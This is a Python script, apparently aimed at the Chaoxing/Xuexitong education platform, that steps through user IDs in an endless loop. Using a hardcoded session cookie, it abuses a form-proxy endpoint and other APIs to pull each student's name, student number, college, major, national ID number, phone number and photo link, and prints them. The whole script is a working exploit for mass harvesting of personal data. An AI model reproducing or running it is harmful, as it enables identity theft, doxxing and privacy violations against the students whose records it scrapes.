# 学习通通过uid查身份证


import requests
# uid = 153161138
# uid = 192230306
uid = 237274183
while 1:

    url = 'https://office.chaoxing.com/front/open/share/apps/forms/fore/events/requesturl?url=https%3A%2F%2Fhbkj.qmx' \
          f'.chaoxing.com%2Fpedestal%2Fapis%2Fcommon%2FgetStudentInfo%3Ffid%3D206208%26uid%3D{uid}&response=%5B%7B' \
          '%22compt%22%3A%22editinput%22%2C%22jpath%22%3A%22%24.xh%22%2C%22pcid%22%3A0%2C%22label%22%3A%22%E5%AD%A6%E5%8F' \
          '%B7%22%2C%22cid%22%3A1%7D%2C%7B%22compt%22%3A%22editinput%22%2C%22jpath%22%3A%22%24.yx%22%2C%22pcid%22%3A0%2C' \
          '%22label%22%3A%22%E5%AD%A6%E9%99%A2%22%2C%22cid%22%3A24%7D%2C%7B%22compt%22%3A%22editinput%22%2C%22jpath%22%3A' \
          '%22%24.bj%22%2C%22pcid%22%3A0%2C%22label%22%3A%22%E7%8F%AD%E7%BA%A7%22%2C%22cid%22%3A13%7D%2C%7B%22compt%22%3A' \
          '%22numberinput%22%2C%22jpath%22%3A%22%24.zjh%22%2C%22pcid%22%3A0%2C%22label%22%3A%22%E8%BA%AB%E4%BB%BD%E8%AF' \
          '%81%E5%8F%B7%E7%A0%81%22%2C%22cid%22%3A47%7D%5D&urlHeaders=%5B%5D&contactMultipleConfig=%7B%7D'
    head = {
        'Content-type': 'application/json;charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Host': 'office.chaoxing.com',
        'Origin': 'https://office.chaoxing.com',
        'Referer': 'https://office.chaoxing.com/front/approve/apps/forms/fore/apply?id=68250&aprvAppId=68250&pageEnc=6fdc77ef0ba20de019560625bf234947&appId=1b92574eb7784050b007faef41d63f18&appKey=3VV7620yGn%2F71Hdd&fidEnc=03bd5e3aad7875c8&uid=153161167&mappId=8125375&mappIdEnc=73af9b0bae9f64db4eb69bcee125812c&code=TCZx0HnK&state=206208',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-G973N Build/PPR1.190810.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 com.chaoxing.mobile/ChaoXingStudy_3_4.3.4_android_phone_494_27 (@Kalimdor)_fc5d87b6fc394ba2a1a9ab86cc351a53',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Cookie': 'oa_deptid=206208; oa_uid=153161167;oa_enc=a55490a8e0e450a6042b2e80f86fc905; ',
    }
    nameurl = f'https://learn.chaoxing.com/apis/friend/getFriendsReadRank?tid=107798320&puid={uid}&eStatBy=day&rankType=friends&page=1&pageSize=5'
    try:
        res = requests.post(url, headers=head)
        xuehao = res.json()['data'][0]['val']
        xueyuan = res.json()['data'][1]['val']
        zhuanye = res.json()['data'][2]['val']
        shenfenzheng = res.json()['data'][3]['val']
        resname = requests.post(nameurl)
        name = resname.json()['data']['curUserRank']['esTitle']
        phoneurl = f'https://office.chaoxing.com/data/apps/forms/fore/forms/user/link/field/data?formId=538041&enc=740ca4cfd3d083d10129cde0cb17d45a&linkFormValueFieldId=32&linkFormValueFieldCompt=editinput&condFields=%5B%7B%22id%22%3A2%2C%22compt%22%3A%22contact%22%2C%22val%22%3A%22{uid}%22%7D%2C%7B%22id%22%3A1%2C%22compt%22%3A%22editinput%22%2C%22val%22%3A%22{xuehao}%22%7D%5D'

        resphone = requests.post(phoneurl, headers=head)
        tel = resphone.json()['data']['detail']['formValue'][0]['val']
        pic = f'http://jwgl.ncist.edu.cn/_photo/Student/{xuehao}.jpg'
        print("姓名：" + name)
        print("学号：" + xuehao)
        print("学院：" + xueyuan)
        print("专业：" +zhuanye )
        print("身份证号：" + shenfenzheng)
        print("手机号" +tel )
        print("照片:" + pic)

    except:
        pass
    finally:
        print(uid)
        uid = uid + 1
